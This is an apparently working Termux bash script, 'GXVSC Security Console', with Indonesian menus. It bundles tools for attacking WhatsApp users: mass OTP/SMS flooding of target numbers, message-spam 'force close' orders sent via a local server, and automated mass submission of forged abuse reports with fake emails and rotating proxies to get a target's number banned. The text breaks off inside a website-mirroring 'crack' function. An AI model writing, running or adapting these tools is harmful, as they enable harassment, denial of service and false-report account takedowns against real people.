#!/data/data/com.termux/files/usr/bin/bash
# ============================================================
# GXVSC - Termux Security Console
# Developer : gixyzzfforrmee
# Version   : 2.3
# ============================================================

set -u

NAME="GXVSC"
DEV="gixyzzfforrmee"
VER="2.3"

SMM_PANEL_URL="${SMM_PANEL_URL:-}"
SMM_PANEL_KEY="${SMM_PANEL_KEY:-}"

MAX_QTY=5000000

green='\033[1;32m'; cyan='\033[1;36m'; white='\033[1;37m'
red='\033[1;31m'; yellow='\033[1;33m'; gray='\033[0;90m'
magenta='\033[1;35m'; reset='\033[0m'

c() { printf '%b' "$1"; }
line() { c "${cyan}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${reset}\n"; }
pause() {
    printf "\n"
    c "${gray}   ╭─────────────────────────────────╮${reset}\n"
    c "${gray}   │${reset}  ${white}tekan${reset} ${cyan}ENTER${reset} ${white}untuk kembali${reset}    ${gray}│${reset}\n"
    c "${gray}   ╰─────────────────────────────────╯${reset}\n"
    read -r
}
have() { command -v "$1" >/dev/null 2>&1; }

ensure_pkg() {
    local cmd="$1" pkg="$2"
    if ! have "$cmd"; then
        c "${yellow}${cmd} belum tersedia. Install ${pkg}? [y/N]: ${reset}"
        read -r ans
        if [[ "${ans:-N}" =~ ^[Yy]$ ]]; then
            pkg install "$pkg" -y || return 1
        else
            return 1
        fi
    fi
    return 0
}

PROXY_FILE="$HOME/proxies.txt"

rand_hex() {
    local n="${1:-16}"
    if have openssl; then openssl rand -hex "$n"
    else od -An -N"$n" -tx1 /dev/urandom | tr -d ' \n'; fi
}

rand_b64() {
    local n="${1:-16}"
    if have openssl; then openssl rand -base64 "$n" | tr -d '\n'
    else head -c "$n" /dev/urandom | base64 | tr -d '\n'; fi
}

rand_ua() {
    local uas=(
        "WhatsApp/2.24.13.79 Android/14 Device/Xiaomi"
        "WhatsApp/2.24.11.76 Android/13 Device/Samsung"
        "WhatsApp/2.24.10.79 Android/12 Device/Oppo"
        "WhatsApp/2.24.9.77 Android/14 Device/Pixel"
        "WhatsApp/2.24.12.74 Android/13 Device/Vivo"
        "WhatsApp/2.24.8.85 Android/11 Device/Realme"
    )
    printf '%s' "${uas[$((RANDOM % ${#uas[@]}))]}"
}

rand_browser_ua() {
    local uas=(
        "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36"
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36"
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15"
        "Mozilla/5.0 (X11; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0"
    )
    printf '%s' "${uas[$((RANDOM % ${#uas[@]}))]}"
}

pick_proxy() {
    [[ -f "$PROXY_FILE" ]] || { printf ''; return; }
    local -a proxies
    mapfile -t proxies < "$PROXY_FILE"
    [[ ${#proxies[@]} -eq 0 ]] && { printf ''; return; }
    printf '%s' "${proxies[$((RANDOM % ${#proxies[@]}))]}"
}
# ─────────────────────────────────────────────────────────────
# LOADING ANIMATION (v2 — gradient + spinner)
# ─────────────────────────────────────────────────────────────

_c_lerp() {
    # 0..100 → gradient blue → cyan → green
    local pct="$1"
    local r g b
    if (( pct < 50 )); then
        r=$(( 0 ))
        g=$(( 80 + pct * 2 ))
        b=$(( 255 - pct ))
    else
        r=$(( 0 ))
        g=$(( 180 + (pct - 50) * 1 ))
        b=$(( 205 - (pct - 50) * 4 ))
    fi
    (( r < 0 )) && r=0; (( g < 0 )) && g=0; (( b < 0 )) && b=0
    (( r > 255 )) && r=255; (( g > 255 )) && g=255; (( b > 255 )) && b=255
    printf '\033[38;2;%d;%d;%dm' "$r" "$g" "$b"
}

_spin_frames=("⣾" "⣽" "⣻" "⢿" "⡿" "⣟" "⣯" "⣷")

_loadbar() {
    # $1 = pid, $2 = label
    local pid="$1"
    local label="${2:-working}"
    local width=42
    local i=0
    local start_ts; start_ts=$(date +%s)
    printf "\n" >&2

    while kill -0 "$pid" 2>/dev/null; do
        local pct=$(( i % 101 ))
        local filled=$(( pct * width / 100 ))
        local empty=$(( width - filled ))
        local bar=""
        local j
        for (( j=0; j<filled; j++ )); do bar+="━"; done
        for (( j=0; j<empty; j++ )); do bar+="·"; done

        local col; col="$(_c_lerp "$pct")"
        local sp="${_spin_frames[$((i % 8))]}"
        local elapsed=$(( $(date +%s) - start_ts ))

        printf "\r   ${col}%s${reset}  ${col}%s${reset}  ${white}%3d%%${reset}  ${gray}%s · %ds${reset}\033[K" \
            "$sp" "$bar" "$pct" "$label" "$elapsed" >&2
        i=$(( i + 2 ))
        sleep 0.05
    done
    # clean line
    printf "\r\033[K" >&2
}

_run_with_bar() {
    local label="$1"; shift
    local cmd="$*"
    bash -c "$cmd" &
    local pid=$!
    _loadbar "$pid" "$label"
    wait "$pid" 2>/dev/null
    local rc=$?
    local col; col="$(_c_lerp 100)"
    printf "   ${col}✓${reset}  ${white}%s${reset}  ${gray}selesai${reset}\n" "$label" >&2
    return "$rc"
}

_run_with_bar() {
    # $1 = label, $2 = command
    local label="$1"; shift
    local cmd="$*"
    bash -c "$cmd" &
    local pid=$!
    _loadbar "$pid" "$label"
    wait "$pid"
    local rc=$?
    c "   ${green}✓${reset}  ${white}${label}${reset} ${gray}selesai${reset}\n"
    return $rc
}

# ─────────────────────────────────────────────────────────────
# UI HELPERS — logo per fitur + loadbar
# ─────────────────────────────────────────────────────────────

_feat_banner() {
    # $1 = logo lines (array), $2 = subtitle
    local -a logo=("${!1}")
    local sub="$2"
    clear
    printf "\n"
    local l
    for l in "${logo[@]}"; do
        c "    ${cyan}${l}${reset}\n"
    done
    printf "\n"
    c "    ${gray}${sub}${reset}\n"
    line
    printf "\n"
}

_loadbar_wrap() {
    # $1 = label, $2 = cmd; prints progress bar
    local label="$1"; shift
    local cmd="$*"
    local tmpf="$HOME/.gxvsc_lb_$$"
    : > "$tmpf"

    bash -c "$cmd > '$tmpf' 2>&1" &
    local pid=$!
    local i=0
    local start_ts; start_ts=$(date +%s)

    while kill -0 "$pid" 2>/dev/null; do
        local pct=$(( i % 101 ))
        local filled=$(( pct * 40 / 100 ))
        local empty=$(( 40 - filled ))
        local bar="" j
        for (( j=0; j<filled; j++ )); do bar+="━"; done
        for (( j=0; j<empty; j++ )); do bar+="·"; done
        local col; col="$(_c_lerp "$pct")"
        local sp="${_spin_frames[$((i % 8))]}"
        local elapsed=$(( $(date +%s) - start_ts ))
        printf "\r    ${col}%s${reset}  ${col}%s${reset}  ${white}%3d%%${reset}  ${gray}%s · %ds${reset}\033[K" \
            "$sp" "$bar" "$pct" "$label" "$elapsed"
        i=$(( i + 2 ))
        sleep 0.05
    done
    wait "$pid" 2>/dev/null
    printf "\r\033[K"
    cat "$tmpf" 2>/dev/null
    rm -f "$tmpf"
}

banner() {
    clear
    printf "\n"
    c "${cyan}     ██████╗ ██╗  ██╗ ██╗   ██╗ ███████╗  ██████╗${reset}\n"
    c "${cyan}    ██╔════╝ ╚██╗██╔╝ ██║   ██║ ██╔════╝ ██╔════╝${reset}\n"
    c "${cyan}    ██║  ███╗ ╚███╔╝  ██║   ██║ ███████╗ ██║${reset}\n"
    c "${cyan}    ██║   ██║ ██╔██╗  ╚██╗ ██╔╝ ╚════██║ ██║${reset}\n"
    c "${cyan}    ╚██████╔╝██╔╝ ██╗  ╚████╔╝  ███████║ ╚██████╗${reset}\n"
    c "${cyan}     ╚═════╝ ╚═╝  ╚═╝   ╚═══╝   ╚══════╝  ╚═════╝${reset}\n"
    printf "\n"
    c "    ${gray}─────${reset} ${white}SECURITY CONSOLE${reset} ${gray}·${reset} ${cyan}v${VER}${reset} ${gray}─────${reset}\n"
    printf "\n"

    local sender="none"
    [[ -f ~/panel/sender.txt ]] && sender="$(cat ~/panel/sender.txt 2>/dev/null)"

    c "    ${gray}dev${reset}      ${white}${DEV}${reset}\n"
    c "    ${gray}status${reset}   ${green}●${reset} ${white}active${reset}\n"
    c "    ${gray}system${reset}   ${white}termux${reset}\n"
    c "    ${gray}proxy${reset}    ${white}$([[ -f "$PROXY_FILE" ]] && wc -l < "$PROXY_FILE" 2>/dev/null || echo 0)${reset} ${gray}loaded${reset}\n"
    if [[ "$sender" == "none" ]]; then
        c "    ${gray}sender${reset}   ${red}belum login${reset} ${gray}(pakai [02])${reset}\n"
    else
        c "    ${gray}sender${reset}   ${green}+${sender}${reset}\n"
    fi
    printf "\n"
    c "    ${gray}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${reset}\n"
    printf "\n"
}

# ─────────────────────────────────────────────────────────────
# WA PRIMITIVES
# ─────────────────────────────────────────────────────────────

wa_build_params() {
    local cc="$1" num="$2" extra="${3:-}"
    local id token ts
    id="$(rand_hex 32)"; token="$(rand_b64 32)"; ts="$(date +%s)000"
    printf 'cc=%s&in=%s&lg=id&lc=ID&id=%s&mistyped=0&authkey=&simnum=1&client_ts=%s&backup_token=&token=%s%s' \
        "$cc" "$num" "$id" "$ts" "$token" "${extra:+&$extra}"
}

wa_exist() {
    local cc="$1" num="$2"
    local proxy; proxy="$(pick_proxy)"
    local -a popts=(); [[ -n "$proxy" ]] && popts+=(--proxy "$proxy")
    local out
    out="$(curl -sS --max-time 20 -A "$(rand_ua)" "${popts[@]}" \
        -H "Content-Type: application/x-www-form-urlencoded" \
        -H "Accept: */*" \
        --data "$(wa_build_params "$cc" "$num")" \
        "https://v.whatsapp.net/v2/exist" 2>/dev/null)"
    if printf '%s' "$out" | grep -qi '<exist>'; then
        if printf '%s' "$out" | grep -qi '<status>ok'; then printf 'exists'
        else printf 'not exists'; fi
    else printf 'error'; fi
}

wa_request_code() {
    local cc="$1" num="$2" method="${3:-sms}"
    local proxy; proxy="$(pick_proxy)"
    local -a popts=(); [[ -n "$proxy" ]] && popts+=(--proxy "$proxy")
    local out http_code
    out="$(curl -sS --max-time 20 -A "$(rand_ua)" "${popts[@]}" \
        -H "Content-Type: application/x-www-form-urlencoded" \
        -H "Accept: */*" \
        -w "\n__HTTP:%{http_code}__" \
        --data "$(wa_build_params "$cc" "$num" "method=${method}")" \
        "https://v.whatsapp.net/v2/code" 2>&1)"

    http_code="$(printf '%s' "$out" | grep -oP '__HTTP:\K[0-9]+')"
    local body
    body="$(printf '%s' "$out" | sed 's/__HTTP:[0-9]*__//')"

    {
        printf "=== %s ===\n" "$(date)"
        printf "cc=%s num=%s method=%s\n" "$cc" "$num" "$method"
        printf "HTTP: %s\n" "$http_code"
        printf "BODY:\n%s\n\n" "$body"
    } >> "$HOME/wa_debug.log"

    local status reason
    status="$(printf '%s' "$body" | grep -oP '(?<=<status>)[^<]+' | head -n1)"
    reason="$(printf '%s' "$body" | grep -oP '(?<=<reason>)[^<]+' | head -n1)"
    if [[ -n "$status" ]]; then
        printf '%s%s' "$status" "${reason:+ | $reason}"
    elif [[ -n "$http_code" && "$http_code" != "000" ]]; then
        printf 'http-%s' "$http_code"
    else
        printf 'error'
    fi
}

# ─────────────────────────────────────────────────────────────
# 01 — WA OTP SPAM
# ─────────────────────────────────────────────────────────────

wa_otp_spam() {
    _feat_banner '(
        " ██████╗ ████████╗██████╗     ███████╗██████╗  █████╗ ███╗   ███╗"
        "██╔═══██╗╚══██╔══╝██╔══██╗    ██╔════╝██╔══██╗██╔══██╗████╗ ████║"
        "██║   ██║   ██║   ██████╔╝    ███████╗██████╔╝███████║██╔████╔██║"
        "██║   ██║   ██║   ██╔═══╝     ╚════██║██╔═══╝ ██╔══██║██║╚██╔╝██║"
        "╚██████╔╝   ██║   ██║         ███████║██║     ██║  ██║██║ ╚═╝ ██║"
        " ╚═════╝    ╚═╝   ╚═╝         ╚══════╝╚═╝     ╚═╝  ╚═╝╚═╝     ╚═╝"
    )' "whatsapp otp spam — multi target · free-sms engine"
    clear
    line; c "${white}WHATSAPP OTP SPAM${reset}\n"
    c "${gray}via free-sms — multi target${reset}\n"; line

    if [[ ! -x ~/free-sms/auto.exp ]]; then
        c "${red}auto.exp gak ada${reset}\n"; pause; return
    fi

    printf "${white}target(s) — pisah koma buat multi. contoh: +6281,+6282: ${reset}\n"
    printf "${cyan}  > ${reset}"; read -r nums_in
    [[ -n "$nums_in" ]] || { c "${red}kosong${reset}\n"; pause; return; }

    # normalisasi semua nomor
    local -a nums=()
    local n
    for n in ${nums_in//,/ }; do
        [[ -n "$n" ]] || continue
        [[ "$n" == +* ]] || n="+$n"
        nums+=("$n")
    done
    (( ${#nums[@]} == 0 )) && { c "${red}kosong${reset}\n"; pause; return; }

    printf "${white}jumlah otp per nomor [3]: ${reset}"; read -r total; total="${total:-3}"
    [[ "$total" =~ ^[0-9]+$ ]] || total=3
    (( total < 1 )) && total=3

    printf "${white}delay antar batch detik [5]: ${reset}"; read -r delay; delay="${delay:-5}"
    [[ "$delay" =~ ^[0-9]+$ ]] || delay=5

    printf "\n"
    line
    c "${cyan}targets${reset}  ${white}${#nums[@]} nomor${reset}\n"
    c "${cyan}per nomor${reset} ${white}${total} otp${reset}\n"
    c "${cyan}delay${reset}    ${white}${delay}s${reset}\n"
    c "${gray}·  server Sxp-ID ≈ 60-90s per OTP${reset}\n"
    line

    local t_start; t_start=$(date +%s)
    local total_ok=0
    local round=0

    while :; do
        (( round++ ))
        printf "\n"
        c "   ${gray}════ batch ${round} ════${reset}\n"

        # hitung berapa target yang masih belum penuh
        local -a pending=()
        for n in "${nums[@]}"; do
            local cf="$HOME/.gxvsc_otp_${n//[^0-9]/}.txt"
            local done_n=0
            [[ -f "$cf" ]] && done_n="$(cat "$cf" 2>/dev/null)"
            (( done_n < total )) && pending+=("$n")
        done
        (( ${#pending[@]} == 0 )) && break

        # fire paralel — 1 OTP per nomor yang masih pending
        local -a pids=()
        local -a tmpfiles=()
        for n in "${pending[@]}"; do
            local tf="$HOME/.gxvsc_otp_tmp_$$_${n//[^0-9]/}"
            : > "$tf"
            ( ~/free-sms/auto.exp "$n" 1 > "$tf" 2>&1 ) &
            pids+=("$!")
            tmpfiles+=("$tf")
        done

        # tunggu semua selesai (paralel)
        local pid_idx=0
        local dots=0
        while :; do
            local alive=0
            local p
            for p in "${pids[@]}"; do
                kill -0 "$p" 2>/dev/null && (( alive++ ))
            done
            (( alive == 0 )) && break
            local sp="${_spin_frames[$((dots % 8))]}"
            printf "\r   ${cyan}%s${reset}  ${white}menunggu %d nomor paralel${reset}  ${gray}· %ds${reset}\033[K" \
                "$sp" "$alive" "$(( $(date +%s) - t_start ))"

            dots=$(( dots + 1 ))
            sleep 0.15
        done
        printf "\r\033[K"

        # proses hasil
        local idx=0
        for n in "${pending[@]}"; do
            local tf="${tmpfiles[$idx]}"
            local out; out="$(cat "$tf" 2>/dev/null || echo '')"
            rm -f "$tf"

            local ok; ok=$(printf '%s' "$out" | grep -ac "Berhasil")
            local cf="$HOME/.gxvsc_otp_${n//[^0-9]/}.txt"
            local done_n=0
            [[ -f "$cf" ]] && done_n="$(cat "$cf" 2>/dev/null)"
            done_n=$(( done_n + ok ))
            printf '%s' "$done_n" > "$cf"

            total_ok=$(( total_ok + ok ))

            if (( ok > 0 )); then
                printf "   ${green}✓${reset}  ${white}%s${reset}  ${gray}${done_n}/${total}${reset}\n" "$n"
            else
                printf "   ${red}✗${reset}  ${white}%s${reset}  ${gray}gagal${reset}\n" "$n"
            fi
            (( idx++ ))
        done

        # cek semua selesai
        local all_done=1
        for n in "${nums[@]}"; do
            local cf="$HOME/.gxvsc_otp_${n//[^0-9]/}.txt"
            local done_n=0
            [[ -f "$cf" ]] && done_n="$(cat "$cf" 2>/dev/null)"
            (( done_n < total )) && { all_done=0; break; }
        done
        (( all_done )) && break

        c "   ${gray}jeda ${delay}s...${reset}\n"
        sleep "$delay"
    done

    # cleanup
    for n in "${nums[@]}"; do
        rm -f "$HOME/.gxvsc_otp_${n//[^0-9]/}.txt"
    done

    local t_end; t_end=$(date +%s)
    local dur=$(( t_end - t_start ))

    printf "\n"
    line
    c "   ${green}✓${reset}  ${white}selesai${reset}\n"
    c "   ${gray}├${reset}  total OTP     ${white}${total_ok}${reset}\n"
    c "   ${gray}├${reset}  dari          ${white}${#nums[@]} nomor${reset}\n"
    c "   ${gray}├${reset}  durasi        ${white}${dur}s${reset}\n"
    c "   ${gray}╰${reset}  rate          ${white}~$(awk -v o="$total_ok" -v d="$dur" 'BEGIN{if(d>0) printf "%.3f",o/d; else print "0"}')/s${reset}\n"
    line
    pause
}

# ─────────────────────────────────────────────────────────────
# 02 — WA FORCE CLOSE
# ─────────────────────────────────────────────────────────────

wa_force_close() {
    _feat_banner '(
        "███████╗ ██████╗ ██████╗  ██████╗███████╗     ██████╗██╗      ██████╗ ███████╗███████╗"
        "██╔════╝██╔═══██╗██╔══██╗██╔════╝██╔════╝    ██╔════╝██║     ██╔═══██╗██╔════╝██╔════╝"
        "█████╗  ██║   ██║██████╔╝██║     █████╗      ██║     ██║     ██║   ██║███████╗█████╗"
        "██╔══╝  ██║   ██║██╔══██╗██║     ██╔══╝      ██║     ██║     ██║   ██║╚════██║██╔══╝"
        "██║     ╚██████╔╝██║  ██║╚██████╗███████╗    ╚██████╗███████╗╚██████╔╝███████║███████╗"
        "╚═╝      ╚═════╝ ╚═╝  ╚═╝ ╚═════╝╚══════╝     ╚═════╝╚══════╝ ╚═════╝ ╚══════╝╚══════╝"
    )' "force close — sender spam via local server (port 3333)"
    clear
    line; c "${white}WHATSAPP FORCE CLOSE${reset}\n"
    c "${gray}via local server (port 3333)${reset}\n"; line

    # cek server hidup
    local info
    info="$(curl -sS --max-time 5 http://localhost:3333/ 2>/dev/null)"
    if [[ -z "$info" ]]; then
        c "${red}server belum jalan.${reset}\n"
        c "${gray}jalankan dulu:${reset}\n"
        c "   ${white}cd ~/wa-server && node wa-server.js${reset}\n"
        pause; return
    fi

    local status sender today_used
    status="$(printf '%s' "$info" | grep -oP '"status":"\K[^"]+')"
    sender="$(printf '%s' "$info" | grep -oP '"sender":"\K[^"]+' | head -n1)"
    today_used="$(printf '%s' "$info" | grep -oP '"today_sent":\K[0-9]+')"
    [[ -z "$today_used" ]] && today_used=0

    if [[ "$status" != "ready" ]]; then
        c "${red}sender belum ke-link.${reset}\n"
        c "${gray}cek terminal wa-server, scan QR / masukin kode.${reset}\n"
        pause; return
    fi

    c "${cyan}sender${reset}  ${white}+${sender}${reset}\n"
    c "${cyan}hari ini${reset} ${white}${today_used}/300 terpakai${reset}\n"
    line

    printf "${white}target number: ${reset}"; read -r target
    [[ -n "$target" ]] || { c "${red}kosong${reset}\n"; pause; return; }

    printf "${white}jumlah pesan [100]: ${reset}"; read -r count; count="${count:-100}"
    [[ "$count" =~ ^[0-9]+$ ]] || count=100

    printf "${white}delay ms [300]: ${reset}"; read -r delay; delay="${delay:-300}"
    [[ "$delay" =~ ^[0-9]+$ ]] || delay=300
    (( delay < 300 )) && { c "${yellow}delay < 300 → di-set ke 300 (auto)${reset}\n"; delay=300; }

    printf "\n"
    line

    local resp
    resp="$(curl -sS --max-time 15 -X POST http://localhost:3333/spam \
        -H "Content-Type: application/json" \
        -d "{\"target\":\"$target\",\"count\":$count,\"delay\":$delay}" 2>/dev/null)"

    if [[ -z "$resp" ]]; then
        c "${red}server gak respon.${reset}\n"; pause; return
    fi

    local err
    err="$(printf '%s' "$resp" | grep -oP '"error":"\K[^"]+' | head -n1)"
    if [[ -n "$err" ]]; then
        case "$err" in
            daily_limit_reached) c "${red}limit harian tercapai (300). tunggu besok.${reset}\n" ;;
            too_many_targets_today) c "${red}udah 10 target hari ini. besok lagi.${reset}\n" ;;
            wa_not_ready) c "${red}sender belum siap.${reset}\n" ;;
            *) c "${red}error: ${err}${reset}\n" ;;
        esac
        pause; return
    fi

    local final_count
    final_count="$(printf '%s' "$resp" | grep -oP '"count":\K[0-9]+' | head -n1)"
    c "${green}✓${reset}  order dikirim  ${gray}(${final_count} pesan, ${delay}ms)${reset}\n"
    c "${gray}progress di terminal server (wa-server.js).${reset}\n"
    line
    pause
}

# ─────────────────────────────────────────────────────────────
# 03 / 09 — WA BAN
# ─────────────────────────────────────────────────────────────

_rand_str() {
    local n="${1:-16}"
    if have openssl; then openssl rand -hex "$n" | head -c "$n"
    else od -An -N"$n" -tx1 /dev/urandom | tr -d ' \n' | head -c "$n"; fi
}

_send_wa_report() {
    local pn="$1"
    local msg="$2"
    local email
    email="$(_rand_str 10)@tempmail.com"
    local csrf; csrf="$(_rand_str 32)"
    local ul; ul="$(_rand_str 32)"
    local ua; ua="$(rand_browser_ua)"
    local platform
    platform=$(shuf -n1 -e WHATS_APP_WEB_DESKTOP WHATS_APP_ANDROID 2>/dev/null || echo WHATS_APP_WEB_DESKTOP)

    local proxy; proxy="$(pick_proxy)"
    local -a popts=(); [[ -n "$proxy" ]] && popts+=(--proxy "$proxy")

    curl -sS --max-time 15 "${popts[@]}" \
        -A "$ua" \
        -H "Accept: */*" \
        -H "Accept-Language: id-ID,id;q=0.9,en;q=0.8" \
        -H "Content-Type: application/x-www-form-urlencoded" \
        -H "Origin: https://www.whatsapp.com" \
        -H "Referer: https://www.whatsapp.com/contact/?subject=messenger" \
        -H "Sec-Fetch-Dest: empty" \
        -H "Sec-Fetch-Mode: cors" \
        -H "Sec-Fetch-Site: same-origin" \
        -H "x-asbd-id: $((RANDOM % 900000 + 100000))" \
        -H "x-fb-lsd: AVoCvX9IGCU" \
        -b "wa_csrf=${csrf}; wa_lang_pref=id; wa_ul=${ul}" \
        --data-urlencode "country_selector=ID" \
        --data-urlencode "email=${email}" \
        --data-urlencode "email_confirm=${email}" \
        --data-urlencode "phone_number=${pn}" \
        --data-urlencode "platform=${platform}" \
        --data-urlencode "your_message=${msg}" \
        --data-urlencode "step=submit" \
        "https://www.whatsapp.com/contact/noclient/async/new/" \
        -o /dev/null -w "%{http_code}" 2>/dev/null
}

wa_ban() {
        _feat_banner '(
        "██████╗  █████╗ ███╗   ██╗     ██████╗ ███████╗ ██████╗ ██╗   ██╗███████╗███████╗████████╗"
        "██╔══██╗██╔══██╗████╗  ██║    ██╔═══██╗██╔════╝██╔═══██╗██║   ██║██╔════╝██╔════╝╚══██╔══╝"
        "██████╔╝███████║██╔██╗ ██║    ██║   ██║█████╗  ██║   ██║██║   ██║█████╗  ███████╗   ██║"
        "██╔══██╗██╔══██║██║╚██╗██║    ██║▄▄ ██║██╔══╝  ██║   ██║██║   ██║██╔══╝  ╚════██║   ██║"
        "██████╔╝██║  ██║██║ ╚████║    ╚██████╔╝███████╗╚██████╔╝╚██████╔╝███████╗███████║   ██║"
        "╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝     ╚══▀▀═╝ ╚══════╝ ╚═════╝  ╚═════╝ ╚══════╝╚══════╝   ╚═╝"
    )' "ban request — abuse form spam · parallel + proxy rotation"
    ensure_pkg curl curl || { pause; return; }
    clear
    line; c "${white}WHATSAPP BAN REQUEST${reset}\n"
    c "${gray}abuse form spam — paralel + proxy rotation${reset}\n"; line

    printf "${white}target number (contoh 6289xxx): ${reset}"; read -r pn
    [[ -n "$pn" ]] || { c "${red}kosong${reset}\n"; pause; return; }
    pn="${pn//[^0-9]/}"
    [[ "$pn" == 62* ]] && pn="${pn:2}"
    [[ "$pn" == 0* ]] && pn="${pn:1}"

    printf "${white}jumlah laporan [100]: ${reset}"; read -r total
    [[ "$total" =~ ^[0-9]+$ ]] || total=100
    (( total < 1 )) && total=100

    printf "${white}thread paralel [10]: ${reset}"; read -r threads
    [[ "$threads" =~ ^[0-9]+$ ]] || threads=10
    (( threads < 1 )) && threads=10
    (( threads > 30 )) && threads=30

    line
    c "${cyan}Target   : ${white}+62${pn}${reset}\n"
    c "${cyan}Laporan  : ${white}${total}${reset}\n"
    c "${cyan}Threads  : ${white}${threads}${reset}\n"
    c "${cyan}Proxy    : ${white}$([[ -f "$PROXY_FILE" ]] && wc -l < "$PROXY_FILE" || echo 0) loaded${reset}\n"
    line
    printf "\n"

    local msg1="Nomor ini [+62${pn}] melakukan SPAM berlebihan menggunakan bot, mohon diberi peringatan segera"
    local msg2="Nomor ini [+62${pn}] menyalahgunakan WhatsApp dengan bot yang dimodifikasi untuk mengirim bug ke nomor saya hingga WhatsApp saya crash"
    local msg3="Nomor ini [+62${pn}] melakukan tindakan yang tidak seharusnya, pengguna ini mengirim pesan yang merusak WhatsApp saya"
    local msg4="Nomor ini [+62${pn}] mengirim link phising https://mfacebookcom.vercel.app/ ke akun saya, mohon diberi sanksi segera"
    local -a msgs=("$msg1" "$msg2" "$msg3" "$msg4")

    # pakai HOME, bukan /tmp
    local codes_file="$HOME/.gxvsc_ban_out_$$"
    : > "$codes_file"

    local t_start; t_start=$(date +%s)
    local i=1
    local batch=0

    while (( i <= total )); do
        local msg="${msgs[$((RANDOM % 4))]}"
        (
            local code
            code="$(_send_wa_report "$pn" "$msg")"
            printf '%s\n' "$code" >> "$codes_file"
        ) &
        (( batch++ ))
        (( i++ ))
        if (( batch >= threads )); then
            # tunggu batch selesai + spinner
            local dots=0
            while :; do
                local alive=0
                local p
                for p in $(jobs -p); do kill -0 "$p" 2>/dev/null && (( alive++ )); done
                (( alive == 0 )) && break
                local sp="${_spin_frames[$((dots % 8))]}"
                local done_n=$(wc -l < "$codes_file" 2>/dev/null || echo 0)
                printf "\r   ${cyan}%s${reset}  ${white}kirim laporan${reset}  ${gray}%d/%d · %ds${reset}\033[K" \
                    "$sp" "$done_n" "$total" "$(( $(date +%s) - t_start ))"
                dots=$(( dots + 1 ))
                sleep 0.15
            done
            wait
            printf "\r\033[K"
            batch=0
        fi
    done
    wait
    printf "\r\033[K"

    local t_end; t_end=$(date +%s)
    local dur=$(( t_end - t_start ))

    local ok errs
    ok=$(grep -c '^200$' "$codes_file" 2>/dev/null || echo 0)
    errs=$(( total - ok ))
    rm -f "$codes_file"

    printf "\n"
    line
    c "   ${green}✓${reset}  ${white}selesai${reset}\n"
    c "   ${gray}├${reset}  total       ${white}${total}${reset}\n"
    c "   ${gray}├${reset}  berhasil    ${green}${ok}${reset}\n"
    c "   ${gray}├${reset}  gagal       ${red}${errs}${reset}\n"
    c "   ${gray}├${reset}  durasi      ${white}${dur}s${reset}\n"
    c "   ${gray}╰${reset}  rate        ${white}~$(awk -v o="$ok" -v d="$dur" 'BEGIN{if(d>0) printf "%.2f", o/d; else print "0"}')/s${reset}\n"
    line
    pause
}

# ─────────────────────────────────────────────────────────────
# 04 — WA UNBAN
# ─────────────────────────────────────────────────────────────

wa_unban() {
    ensure_pkg curl curl || { pause; return; }
    line; c "${white}WHATSAPP UNBAN APPEAL${reset}\n"; line
    printf "${white}Nomor yang di-ban (tanpa +): ${reset}"; read -r num
    printf "${white}Alasan appeal: ${reset}"; read -r reason
    reason="${reason:-Nomor+diblokir+tidak+sengaja}"
    local jar="/tmp/gxvsc_unban_$$.txt"
    local csrf
    csrf="$(curl -sS -c "$jar" --max-time 25 -A "$(rand_ua)" \
        "https://www.whatsapp.com/contact/?form=appeal" 2>/dev/null \
        | grep -oP 'name="csrf_token"\s+value="\K[^"]+' | head -n1)"
    local code
    code="$(curl -sS -b "$jar" -c "$jar" --max-time 25 -A "$(rand_ua)" \
        -H "Content-Type: application/x-www-form-urlencoded" \
        -H "Referer: https://www.whatsapp.com/contact/?form=appeal" \
        --data "csrf_token=${csrf}&cc=id&phone=${num}&subject=Ban+Appeal&description=${reason}&category=ban_appeal&type=appeal" \
        "https://www.whatsapp.com/contact/" -o /dev/null -w "%{http_code}" 2>/dev/null)"
    rm -f "$jar"
    if [[ "$code" == "200" || "$code" == "302" ]]; then c "${green}Appeal terkirim (${code}).${reset}\n"
    else c "${red}Appeal gagal (${code}).${reset}\n"; fi
    pause
}

# ─────────────────────────────────────────────────────────────
# 05 — WEBSITE CRACK (mirror: index.html + css + js + assets)
# ─────────────────────────────────────────────────────────────

website_crack() {
    _feat_banner '(
    "██╗    ██╗███████╗██████╗ ███████╗██╗████████╗███████╗     ██████╗██████╗  █████╗  ██████╗██╗  ██╗"
    "██║    ██║██╔════╝██╔══██╗██╔════╝██║╚══██╔══╝██╔════╝    ██╔════╝██╔══██╗██╔══██╗██╔════╝██║ ██╔╝"
    "██║ █╗ ██║█████╗  ██████╔╝███████╗██║   ██║   █████╗      ██║     ██████╔╝███████║██║     █████╔╝"
    "██║███╗██║██╔══╝  ██╔══██╗╚════██║██║   ██║   ██╔══╝      ██║     ██╔══██╗██╔══██║██║     ██╔═██╗"
    "╚███╔███╔╝███████╗██████╔╝███████║██║   ██║   ██║         ╚██████╗██║  ██║██║  ██║╚██████╗██║  ██╗"
    " ╚══╝╚══╝ ╚══════╝╚═════╝ ╚══════╝╚═╝   ╚═╝   ╚═╝          ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝"
)' "mirror website — index.html + css + js + asset"
    ensure_pkg curl curl || { pause; return; }

    line; c "${white}WEBSITE CRACK${reset}\n"
    c "${gray}Tarik index.html + css + js + gambar + asset${reset}\n"; line
    printf "${white}URL target: ${reset}"; read -r url
    [[ "$url" =~ ^https?:// ]] || url="https://$url"

    local domain; domain="$(printf '%s' "$url" | sed -E 's#^https?://##; s#/.*##')"
    local base;   base="$(printf '%s' "$url" | sed -E 's#/$##')"
    local outdir="/storage/emulated/0/Download/gixyzzXIT_$(date +%s)"
    mkdir -p "$outdir/assets" "$outdir/css" "$outdir/js" "$outdir/img"

    local UA; UA="$(rand_browser_ua)"
    local TMO=4
    local HDRS=(
        -A "$UA"
        -H "Accept: */*"
